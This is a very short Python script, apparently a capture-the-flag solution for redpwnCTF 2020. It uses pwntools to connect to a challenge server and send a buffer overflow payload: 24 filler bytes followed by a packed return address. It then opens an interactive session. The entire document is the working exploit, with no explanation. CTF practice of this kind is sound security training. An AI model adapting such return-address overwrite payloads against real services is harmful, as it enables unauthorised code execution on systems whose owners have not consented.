from pwn import *

r = remote("2020.redpwnc.tf", 31908)

payload = "A"*24
payload += p64(0x004006e6)

r.sendline(payload)
r.interactive()
